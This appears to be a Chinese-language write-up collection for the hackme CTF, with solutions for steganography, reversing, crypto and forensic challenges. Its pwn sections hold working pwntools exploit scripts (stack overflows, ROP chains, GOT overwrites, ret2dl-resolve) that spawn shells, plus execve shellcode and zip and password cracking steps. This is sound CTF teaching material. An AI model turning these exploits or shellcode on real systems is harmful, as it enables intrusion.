[TOC]



# hackme CTF

#### 01 Misc    flag

`FLAG{This is flag's format}`

#### 02 Misc    flag

##### ##LSB隐写

```python
from PIL import Image

im = Image.open('corgi-can-fly.png')
source = im.split()
for i in range(3):
	a=source[i].point(lambda i: i%2==1 and 255)
	a.show()
```

拿到二维码，扫描二维码得到`flag`。

#### 03 Misc    television

```shell
strings television.bmp|grep 'FLAG{.*}
```

#### 04 Misc    meow

```sh
foremost meow.png 
```

得到一张图片`00000000.png`和一个加密的压缩文件`00000094.zip`。压缩文件包含`flag`文件以及`png`图片。

![](.\截图\04_01.PNG)

![](.\截图\04_02.PNG)

对比`00000000.png`和压缩文件中图片的`crc`值相同。

##### ##明文攻击

工具`pkcrack`、`archpr`等。

```sh
root1@root1-virtual-machine:~/Downloads/output/png$ zip plain.zip 00000000.png
  adding: 00000000.png (deflated 0%)
root1@root1-virtual-machine:~/Downloads$ unzip -l ./output/zip/00000094.zip 
Archive:  ./output/zip/00000094.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2016-06-11 16:22   meow/
       47  2016-06-11 16:22   meow/flag
        0  2016-06-11 16:20   meow/t39.1997-6/
        0  2016-06-11 16:21   meow/t39.1997-6/p296x100/
    48543  2014-05-14 05:59   meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png
---------                     -------
    48590                     5 files
root1@root1-virtual-machine:~/Downloads$ ./pkcrack -C ./output/zip/00000094.zip -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P ./output/png/plain.zip -p 00000000.png -d decrypted.zip -a
```

#### 05 Misc    where is flag

```python
import re

patt1=re.compile("FLAG{\w+}")
f=open("flag","r")
content=f.read()
f.close()
print(patt1.findall(content))
```

#### 57 Reversing    rc87cipher

write up：

程序是加了`upx`壳。

##### ##radare2

```
ood                        reopen in debug mode
dcs                        Continue until next syscall
dm                         List memory maps of target process
s addr                     Seek to address
pf.fmt_name                Show data using named format
pf fmt                     Show data using the given format-string.
pf ?                       data structure `pf ? (struct_name)example_name`
pf {integer}? (bifc)       Print integer times the following format (bifc)
```

```
[0x00400000]> pfo?
|Usage: pfo [format-file]
 ~/.config/radare2/format
 /usr/share/radare2/2.3.0/format/
```

```
[0x00400000]> px @ $$+0x10!0x2c
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00400010  0200 3e00 0100 0000 a009 4000 0000 0000  ..>.......@.....
0x00400020  4000 0000 0000 0000 f8cb 0c00 0000 0000  @...............
0x00400030  0000 0000 4000 3800 0600 4000            ....@.8...@.
```

##### ##upx脱壳--radare2

Example：

[![Example](https://asciinema.org/a/35005.svg)](https://asciinema.org/a/35005?autoplay=1)

`upx`在解压的时候不会加载库文件，只会一直调用`syscall`，并且解压最后的一个`syscall`是`munmap`。`pf 9? (elf_phdr)phdr @ $$+0x40!0x200`查看前`9`个`elf_phdr`，范围从`0x400040`到`0x400240`。再把程序`type == PT_LOAD`的段拷贝下来。

rc87cipher：

[![asciinema CLI
demo](https://asciinema.org/a/SRlubXOM08Ijn6qAahOQ6EQvI.svg)](https://asciinema.org/a/SRlubXOM08Ijn6qAahOQ6EQvI?autoplay=1)

对程序进行逆向，还原加密代码，并且实现对应的解密代码。

```c
#include <stdio.h>
void box_c(unsigned int a,unsigned int b,unsigned char sbox[0x100])
{
    int i;
    int tmp;
    for(i=0;i<0x24;i++)
    {
        a=((0xff-a)*13)&0xff;
        b=((0xff-b)*17)&0xff;
        tmp=sbox[a];
        sbox[a]=sbox[b];
        sbox[b]=tmp;
        
    }
}
void generate_sbox(unsigned char sbox[0x100],unsigned char iv[8])
{
    int i;
    for(i=0;i<0x100;i++)
        sbox[i]=i;
    for(i=0;i<8;i++)
    {
        box_c(i,iv[i],sbox);
    }
    
}
void encrypt(FILE *fp,FILE *op,unsigned char *password)
{
    int i,j;
    unsigned char data,enc_data;
    unsigned int itmp,tmp;
    unsigned char iv[8]={0x2d,0xeb,0xbb,0xe3,0xba,0x13,0xef,0x89};//read_from_urandom
    unsigned char sbox[0x100];
    generate_sbox(sbox,iv);
    for(i=0;i<0x100;i++)
    {
        printf("%02x ",sbox[i]);
        if((i+1)%0x10==0)
            printf("\n");
    }
    fwrite(iv,8,1,op);
    i=0;
    while(fread(&data,1,1,fp)==1)
    {
        box_c(i,password[i],sbox);
        i++;
        if(password[i]==0)
            i=0;
        itmp=0xDEADBEEF;
        for(j=0;j<0x100;j++)
            itmp=(0xc8763*sbox[j])^(0x5A77*itmp);
        enc_data=(itmp^(data*0x11))&0xff;
        fwrite(&enc_data,1,1,op);
    }
}
void decrypt(FILE *fp,FILE *op,unsigned char *password)
{
    int i,j;
    unsigned char data,enc_data;
    unsigned int itmp,tmp;
    unsigned char iv[8];
    unsigned char sbox[0x100];
    fread(iv,8,1,fp);
    generate_sbox(sbox,iv);
    for(i=0;i<0x100;i++)
    {
        printf("%02x ",sbox[i]);
        if((i+1)%0x10==0)
            printf("\n");
    }
    i=0;
    while(fread(&enc_data,1,1,fp)==1)
    {
        box_c(i,password[i],sbox);
        i++;
        if(password[i]==0)
            i=0;
        itmp=0xDEADBEEF;
        for(j=0;j<0x100;j++)
            itmp=(0xc8763*sbox[j])^(0x5A77*itmp);
        data=((itmp^enc_data)*0xf1)&0xff;
        fwrite(&data,1,1,op);
    }
}
int main(int argc,char *argv[])
{
    if(argc<=4)
    {
        printf("Usage: %s enc/dec password input output\n", argv[0]);
        return 0;
    }
    unsigned char *password=argv[2];
    FILE *fp,*op;
    fp=fopen(argv[3],"rb");
    if(fp==NULL)
        printf("Can not open input file");
    op=fopen(argv[4],"wb");
    if(op==NULL)
        printf("Can not open output file");
    if((argv[1][0]&0xdf)=='E')
        encrypt(fp,op,password);
    if((argv[1][0]&0xdf)=='D')
        decrypt(fp,op,password);
    fclose(fp);
    fclose(op);
    return 0;
}
```

需要还原`password`才能恢复`flag`。按字节穷尽`password`：

```
#include <stdio.h>
#include <string.h>
void box_c(unsigned int a,unsigned int b,unsigned char sbox[0x100])
{
    int i;
    int tmp;
    for(i=0;i<0x24;i++)
    {
        a=((0xff-a)*13)&0xff;
        b=((0xff-b)*17)&0xff;
        tmp=sbox[a];
        sbox[a]=sbox[b];
        sbox[b]=tmp;
        
    }
}
void generate_sbox(unsigned char sbox[0x100],unsigned char iv[8])
{
    int i;
    for(i=0;i<0x100;i++)
        sbox[i]=i;
    for(i=0;i<8;i++)
    {
        box_c(i,iv[i],sbox);
    }
    
}
void get_next_byte(unsigned char* iv,unsigned char *stmp,unsigned char *password,int len)
{
    int i,j;
    unsigned int itmp;
    unsigned char sbox[0x100];
    unsigned char tmp_sbox[0x100];
    generate_sbox(sbox,iv);
    for(i=0;i<len;i++)
        box_c(i,password[i],sbox);
    for(i=0x21;i<0x7f;i++)
    {
        memcpy(tmp_sbox,sbox,0x100);
        box_c(len,i,tmp_sbox);
        itmp=0xDEADBEEF;
        for(j=0;j<0x100;j++)
            itmp=(0xc8763*tmp_sbox[j])^(0x5A77*itmp);
        itmp=itmp&0xff;
        if(itmp==stmp[len])
        {
            password[len]=i;
            if(i=='}'&&len==39)
            {
                for(j=0;j<=len;j++)
                    printf("%c",password[j]);
                printf("\n");
            }
            if(len<40)
                get_next_byte(iv,stmp,password,len+1);
        }
            
    }
}
void get_password(unsigned char *iv,unsigned char *stmp)
{
    unsigned char sbox[0x100];
    unsigned char password[64]={0};
    get_next_byte(iv,stmp,password,0);
}
int main()
{
    int i;
    unsigned char iv[8];
    unsigned char stmp[0x100];
    FILE *fp,*op;
    fp=fopen("rc87","rb");
    op=fopen("rc87.enc","rb");
    fread(iv,1,8,op);
    for(i=0;i<0x100;i++)
        stmp[i]=((fgetc(fp)*0x11)&0xff)^fgetc(op);
    fclose(fp);
    fclose(op);
    get_password(iv,stmp);
    return 0;
}
```

#### 58 Pwn    catflag

简单的示例。直接`nc`连接服务器端口，`cat flag`即可。

#### 59 Pwn    homework

write up：

部分代码：

```c
void run_program()
{
	int arr[10]; // [esp+14h] [ebp-34h]
	... ...
	__isoc99_scanf("%d", &act);
    switch ( act )
    {
      case 0:
        return;
      case 1:
        printf("Index to edit: ");
        __isoc99_scanf("%d", &i);
        printf("How many? ");
        __isoc99_scanf("%d", &v);
        arr[i] = v;
        break;
	... ...
}
```

可以修改栈里的值。

```c
void call_me_maybe()
{
  system("/bin/sh");
}
```

直接修改`ret_addr`到`call_me_maybe`。

```python
from pwn import *

#context.log_level="debug"
#p=process("./homework")
p=remote("ctf.hackme.quest",7701)

elf = ELF("./homework")
call_me_maybe=elf.symbols['call_me_maybe']
p.recvuntil(b"What's your name? ")
p.sendline(b"test")

p.recvuntil(b"dump all numbers\n > ")
p.sendline(b"1")
p.recvuntil(b"Index to edit: ")
p.sendline(b"14")
p.recvuntil(b"How many? ")
p.sendline(str(call_me_maybe).encode())

p.recvuntil(b"dump all numbers\n > ")
p.sendline(b"0")

p.sendline(b"ls")
p.interactive()
```

#### 70 Pwn    rsbo

参考：

```
https://xz.aliyun.com/t/3703
```

write up：

```c
char buf[80]; // [esp+10h] [ebp-60h] BYREF
v7 = read_80_bytes(buf);
```

```c
ssize_t __cdecl read_80_bytes(void *buf)
{
  return read(0, buf, 0x80u);
}
```

`buf`的大小是`80=0x50`，但是`read`的长度是`0x80`,存在栈溢出的漏洞。

```c
int v5; // [esp+60h] [ebp-10h]
int v6; // [esp+64h] [ebp-Ch]
signed int v7; // [esp+68h] [ebp-8h]
for ( i = 0; i < v7; ++i )
  {
    v6 = rand() % (i + 1);
    v5 = buf[i];
    buf[i] = buf[v6];
    buf[v6] = v5;
  }
```

`for`循环交换第`i`个字符和`<=i`的某个字符的值。而`v5=*(int *)(buf+0x50)`，`v6=*(int *)(buf+0x54)`，`v7=*(signed int *)(buf+0x58)`，并且`v7<=0x80`，`v6<=0x80`。`buf`前`0x58`填充的值`<=0x58`，那么`for`循环到`0x58`的时候将退出，栈溢出部分将不会被破坏。

```
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 70h
```

通过调试发现`ebp=esp-0x70-8`，`buf=esp+0x10=ebp-0x68`，`ret_addr`的值放在栈`ebp+4=buf+0x6c`。

利用方法：

- 利用`open`，`read`，`write`函数把`/home/ctf/flag`中的flag打印出来
- 注意`fd = 0`时代表标准输入`stdin`，`1`时代表标准输出`stdout`，`2`时代表标准错误`stderr`，`3~9`则代表打开的文件，这里我们只打开了一个文件，那么`fd`就是`3`。
- `and     esp, 0FFFFFFF0h`，`esp`偏移在不同情况下不一样。使用`start`填充`ret_addr`时，偏移一致，使用`main`填充`ret_addr`需要进一步调试。可以通过穷尽找到。
- 发送的数据，可能会把两段数据拼凑在一起。发送数据长度为`0x80`时，或者间隔`sleep(0.5)`，更加稳定。

```python
from pwn import *

#context.log_level="debug"
#p = process("./rsbo")
p = remote("ctf.hackme.quest", 7706)

elf = ELF("./rsbo")
start = 0x08048490
open_plt = elf.symbols["open"]
read_plt = elf.symbols["read"]
write_plt = elf.symbols["write"]
bss = elf.bss()
offset = 0x6c
flag_add = 0x80487d0


payload = b'\x00'*offset + p32(open_plt) + p32(start) + p32(flag_add)  + p32(0) 
payload = payload + b'\x00'*(0x80 - len(payload))
p.send(payload)
payload = b'\x00'*offset + p32(read_plt) + p32(start) + p32(0x3) + p32(bss) + p32(0x60)
payload = payload + b'\x00'*(0x80 - len(payload))
p.send(payload)
payload = b'\x00'*offset + p32(write_plt) +p32(0xdeadbeef) + p32(1) + p32(bss) + p32(0x60)
payload = payload + b'\x00'*(0x80 - len(payload))
p.send(payload)

print(p.recv())
p.close()
```

#### 71 Pwn    rsbo-2

参考：

```
https://xz.aliyun.com/t/3703
```

write up：

```python
from pwn import *

#context.log_level="debug"
#p = process("./rsbo")
p = remote("ctf.hackme.quest", 7706)

elf = ELF("./rsbo")
libc = ELF("./libc-2.23.so.i386")
start = 0x08048490
write_plt = elf.plt["write"]
write_got = elf.got["write"]
read_plt = elf.plt["read"]
read_got = elf.got["read"]
bss = elf.bss()
offset = 0x6c


payload = b"\x00" * offset + p32(write_plt) + p32(start) + p32(1) + p32(read_got) + p32(4)
payload = payload + b'\x00'*(0x80 - len(payload))
p.send(payload)
read = u32(p.recv(4))
libc_base=read-libc.symbols["read"]
print("libc   base: %08x"%libc_base)
system_addr = libc_base +libc.symbols["system"]
print("system addr: %08x"%system_addr)

payload = b"\x00" * offset + p32(read) + p32(start) + p32(0) + p32(bss) + p32(8)
payload = payload + b'\x00'*(0x80 - len(payload))
p.send(payload)
p.send(b"/bin/sh\x00")

payload = b"\x00" * offset + p32(system_addr) + p32(start) + p32(bss)
payload = payload + b'\x00'*(0x80 - len(payload))
p.send(payload)

p.sendline(b"ls")
p.interactive()
```

#### 72 Pwn    leave_msg

write up：

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

可以看到`Stack`是可执行的，并且还具有`RWX`权限的`segments`。

```c
    read(0, nptr, 0x10u);
    v3 = atoi(nptr);
    if ( strlen(buf) > 8 )
    {
      puts("Message too long, truncated.");
      buf[8] = 0;
    }
    if ( v3 > 0x40 || nptr[0] == '-' )
      puts("Out of bound.");
    else
      dword_804A060[v3] = (int)strdup(buf);
```

读取一个字符串，然后转换成数字，并且字符串的第一个字符不能时`-`（负号）。在输入的数字前加空白字符`\r\n\t \f\v`就可以轻松绕过。利用这个特点可以修改`got`表的函数。

先修改`strlen`函数，返回值为`0`。再修改`puts`函数，放入`shellcode`。注意`shelcode`中不能有`\x00`字符。

##### ##shellcode

```assembly
global _start
_start:
xor eax,eax
push eax
push "//sh"
push "/bin"
mov ebx,esp
push eax
mov edx,esp
push ebx
mov ecx,esp
mov al,0Bh
int 80h
```

```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

```python
from pwn import *

#context.log_level="debug"
#p = process("./leave_msg")
p = remote("ctf.hackme.quest",7715)


print(p.recvuntil(b'message:\n'))
p.send(b"\x31\xc0\xc3\x00")
print(p.recvuntil(b"slot?\n"))
p.send(b" -15")

print(p.recvuntil(b'message:\n'))
p.send(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
print(p.recvuntil(b"slot?\n"))
p.send(b" -16")

p.sendline(b"ls")
p.interactive()
```

#### 73 Pwn    stack

write up：

文件的保护全都开了。

```sh
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

对比一下源码和反汇编代码。

```c
struct stack {
    int n;
    int data[4096];
//    int data[64];
};


	case 'p':
    if (s.n > 0) {
        printf("Pop -> %d\n", stack_pop(&s));
    } else {
        printf("Error: stack is empty\n");
    }
    //printf("Pop -> %d\n", stack_pop(&s));
    break;
```

```c
    case 'p':
        v3 = stack_pop(v6);
        printf("Pop -> %d\n", v3);
        goto LABEL_9;
```

源码和反汇编是有区别的。反汇编的代码缺少判断，`s.n`可以小于或等于`0`。通过操作可以绕过`canary`直接修改栈里的某个值，绕过`canary`的保护。

 修改`stack[i]=j`（对应`data[i-1]`）的值，步骤：

```
clear stack
pop
push i-1   ---> stack.n=i-1
push j     ---> data[i-i]=j
```

后面就是构造常规的`rop`链获取`shell`。

```python
import re
from pwn import *

patt1=re.compile(b'Pop -> (.*)\nCmd >>\n')

#context.log_level="debug"
p=remote("ctf.hackme.quest",7716)
libc = ELF("./libc-2.23.so.i386")
offset=247

def pop():
    p.sendline(b'p')
    recv_data=p.recvuntil(b"Cmd >>\n")
    return patt1.findall(recv_data)[0].decode()
def push(val):
    p.sendline(b'i '+val.encode())
    recv_data=p.recvuntil(b"Cmd >>\n")
def exit():
    p.sendline(b'x')
    p.recv()

p.recvuntil(b"Cmd >>\n")
pop()
push("93")
lib_main=int(pop())-libc.symbols['__libc_start_main']-offset


system_addr=(lib_main+libc.symbols['system'])
sh_addr=(lib_main+next(libc.search(b'/bin/sh')))

push(str(system_addr))
push('0')
push(str(sh_addr))
exit()

p.sendline(b"ls")
p.interactive()
```

#### 78 Pwn    tictactoe-1

write up：

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
unsigned int sub_8048A4B()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("\nInput move (9 to change flavor): ");
  v1 = sub_804871C();
  if ( v1 == 9 )
  {
    read(0, buf, 4u);
    byte_804B04C = buf[0];
    sub_8048A4B();
  }
  else
  {
    *(_BYTE *)(v1 + 0x804B056) = byte_804B04C;
    if ( sub_80486F0(v1) )
      *(_BYTE *)(v1 + 0x804B04D) = -1;
  }
  return __readgsdword(0x14u) ^ v3;
}
```

`v1`可以为负数，那么可以往任意地址上写值。

修改`got`表，`put` 函数对应的值`0x804B084`修改为`0x8048C46`。

```c
for ( i = 0; i <= 8 && !check_result(); ++i )
  {
    if ( dword_804B048 == -1 )
    {
      sub_80489C0();
    }
    else
    {
      sub_8048762();
      sub_8048A4B();
    }
    dword_804B048 = -dword_804B048;
  }
```

正常情况下，我们只能修改`5`个字节。但是如果把`dword_804B048`值改成`0`（不为`1`及`-1`都可以），那么我们就能再修改`8`个字节。

```python
import struct
from pwn import *

#context.log_level="debug"
#p=process("./tictactoe")
p=remote("ctf.hackme.quest",7714)

move_addr=0x804B056
init_addr=0x804B048
def tict_init():
    p.recvuntil(b"Play (1)st or (2)nd? ")
    p.sendline(b"1")

    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(b"9")
    p.sendline(b"\x00")
    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(str(init_addr-move_addr).encode())
def tict_change(addr,value):
    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(b"9")
    p.sendline(value)
    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(str(addr-move_addr).encode())


elf=ELF("./tictactoe")
puts_got = elf.got["puts"]
tict_init()

change_value=0x8048C46
change_bytes=struct.pack("<I",change_value)
print(change_bytes)
for i in range(len(change_bytes)):
    tict_change(puts_got+i,change_bytes[i:i+1])
p.recv()
p.sendline(b"0")
p.recv()
p.sendline(b"0")
p.recv()
p.sendline(b"0")
p.recv()
p.sendline(b"0")
print(p.recv())
p.close()
```

#### 79 Pwn    tictactoe-2

write up：

##### ##ret2dl-resolve

```
程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,
```

```
在 Linux 中，程序使用 _dl_runtime_resolve(link_map_obj, reloc_offset) 来对动态链接的函数进行重定位。
```

`ret2dl-resolve`利用，把`system`函数的地址写到`memset`函数对应的`got`表中：

```assembly
0804AF54    Elf32_Dyn <5, <80482F8h>> ; DT_STRTAB
08048298    Elf32_Sym <offset aMemset - offset byte_80482F8, 0, 0, 12h, 0, 0> ; "memset"
0804833C    aMemset         db 'memset',0
```

```c
memset 对应的 `Elf32_Sym` 指针 < 44h, 0, 0, 12h, 0, 0>
.dynstr = DT_STRTAB->Elf32_Addr = 0x80482F8
sym->st_name = 0x44
.dynstr + sym->st_name = 0x804833C  aMemset
```

```c
pwndbg> search system
Searching for value: 'system'
tictactoe       0x804900c jae 8049087h /* 'system' */
tictactoe       0x804a00c 'system'
```

修改`DT_STRTAB->Elf32_Addr`值即可。

```c
0x804a00c - 0x44 = 0x8049fc8
```

```python
import struct
from pwn import *

#context.log_level="debug"
#p=process("./tictactoe")
p=remote("ctf.hackme.quest",7714)

move_addr=0x804B056
init_addr=0x804B048
def tict_init():
    p.recvuntil(b"Play (1)st or (2)nd? ")
    p.sendline(b"1")

    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(b"9")
    p.sendline(b"\x00")
    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(str(init_addr-move_addr).encode())
def tict_change(addr,value):
    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(b"9")
    p.sendline(value)
    p.recvuntil(b"Input move (9 to change flavor): ")
    p.sendline(str(addr-move_addr).encode())

tict_init()
change_bytes1=b"sh\x00"

STRTAB=0x0804AF58
memset_sym_stname=0x44
system_addr=0x804a00c
new_elf_string_table=system_addr-memset_sym_stname
change_bytes2 = struct.pack("<I",new_elf_string_table)
print(change_bytes2)

tict_change(init_addr,change_bytes1[0:1])
tict_change(STRTAB,change_bytes2[0:1])
tict_change(init_addr + 1,change_bytes1[1:2])
tict_change(STRTAB + 1,change_bytes2[1:2])
tict_change(init_addr+2,change_bytes1[2:3])
tict_change(STRTAB + 2,change_bytes2[2:3])
tict_change(STRTAB + 3,change_bytes2[3:4])

p.recv()
p.sendline(b"0")
p.recv()
p.sendline(b"ls")
p.interactive()
```

#### 80 Pwn    bytebucket

write up：

```c
bucket *__fastcall malloc_bucket(int size, __int64 name)
{
  bucket *result; // rax
  bucket *bucket_struct; // [rsp+18h] [rbp-8h]

  bucket_struct = (bucket *)malloc(8 * (size + 4LL));
  if ( (unsigned int)set_bucket_name(bucket_struct, (const char *)name) )
  {
    bucket_struct->next = 0LL;
    bucket_struct->size = size;
    result = bucket_struct;
  }
  else
  {
    free(bucket_struct);
    result = 0LL;
  }
  return result;
}
```

`bucket`结构：

```c
struct bucket{
    bucket* next;
    int64 size;
    char[16] name;
    char* slot0;
    char* slot1;
    ...
}
```

#### 81 Pwn    bytebucket-2

#### 97 Crypto    ffa

write up：

加密代码：

```python
#!/usr/bin/env python3
import sympy
import json

m = sympy.randprime(2**257, 2**258)
M = sympy.randprime(2**257, 2**258)
a, b, c = [(sympy.randprime(2**256, 2**257) % m) for _ in range(3)]

x = (a + b * 3) % m
y = (b - c * 5) % m
z = (a + c * 8) % m

flag = int(open('flag', 'rb').read().strip().hex(), 16)
p = pow(flag, a, M)
q = pow(flag, b, M)

json.dump({ key: globals()[key] for key in "Mmxyzpq" }, open('crypted', 'w'))
```

通过`xyz`与`abc`的关系：

```python
x = (a + b * 3) % m
y = (b - c * 5) % m
z = (a + c * 8) % m
```

可以得到：

```python
x - 3y - z = 7c % m
y + 5c     = b  % m
z - 8c     = a  % m
```

解密代码：

```python
import json
from gmpy2 import *

cry=json.load(open('crypted', 'r'))
M=cry['M']
m=cry['m']
x=cry['x']
y=cry['y']
z=cry['z']
p=cry['p']
q=cry['q']


d=invert(7,m)
c=((x-3*y-z)*d)%m
b=(y+5*c)%m
a=(z-8*c)%m


a_inv=invert(a,M-1)
b_inv=invert(b,M-1)

flag1=pow(p,a_inv,M)
flag1=digits(flag1,16)
print(bytes.fromhex(flag1))

flag2=pow(q,b_inv,M)
flag2=digits(flag2,16)
print(bytes.fromhex(flag2))
```

#### 98 Programming    fast

```python
import re
from pwn import *

patt1=re.compile(b"(-?\d*) ([\+\*-/]) (-?\d*) = \?\n")
#context.log_level="debug"
#p=process("./fast")
p=remote("ctf.hackme.quest",7707)
p.recvuntil(b"game.\n")
p.sendline(b"Yes I know")
results=[]
for k in range(10000):
    a=p.recvuntil(b"?\n")
    patt1.findall(a)
    num1,operation,num2=patt1.findall(a)[0]
    num1=int(num1)
    num2=int(num2)
    num3=0
    if operation==b"+":
        num3=num1+num2
    if operation==b"-":
        num3=num1-num2
    if operation==b"*":
        num3=num1*num2
    if operation==b"/":
        num3=int(num1/num2)
    num3=num3&0xffffffff
    if num3>0x7fffffff:
        num3=num3-0x100000000
    results.append(str(num3))

for each in results:
    p.sendline(each.encode())
print(p.recv())
p.close()
```

#### 99 Lucky    you-guess

爆破字典，猜口令。根据`'%s really hates her ex.' % password`，选择一个女性用户名的字典。

```
import hashlib
import sys

def sha512(s):
    return hashlib.sha512(s.encode()).hexdigest()

def verify(password):
    h = sha512('your hash is ' + sha512(password) + ' but password is not password')

    if h == '2a9b881b84d4386e39518c8802cc8167ec84d37118efd3949dbedd5e73bf74b62d80bf1531b7505a197565660bf452b2641cd5cd12f0c99c502a4d72c28197f2':
        key = bytes.fromhex(sha512('%s really hates her ex.' % password))
        encrypted = bytes.fromhex('20a6b2b83f1731a5bafdc19b4c954cd34419412951e85de45fb904fc5c1a9470eda8d58483e1fb66e3e13f656e0677f75fccb6ff0577e42b5c53620d10178c0f')
        flag = bytearray(i ^ j for i, j in zip(bytearray(key), bytearray(encrypted)))
        print(flag.decode().strip(',.~'))
        return 1
    else:
        #print('Hmmmmm?!')
        return 0
        
#http://aciddr0p.net/pwls.html
#download female-names.txt from http://antirez.com/misc/female-names.txt
f=open("female-names.txt","r")
while True:
    password=f.readline().strip('\n')
    if password=="":
        break
    if verify(password)==1:
        print(password)
        break
f.close()
```



#### 100 Forensic    easy pdf

提取`pdf`的文字内容：

```python
import pypdf

reader = pypdf.PdfReader('easy.pdf')
for page in reader.pages:
    print(page.extract_text())
```

#### 101 Forensic    this is a pen

在`pdf`的文字内容里并没有找到`flag`，尝试提取图片：

```python
import pypdf

i=0
reader = pypdf.PdfReader('this-is-a-pen.pdf')
for page in reader.pages:
    for image_file_object in page.images:
        f=open(str(i) + image_file_object.name, "wb")
        f.write(image_file_object.data)
        f.close()
        i=i+1
```

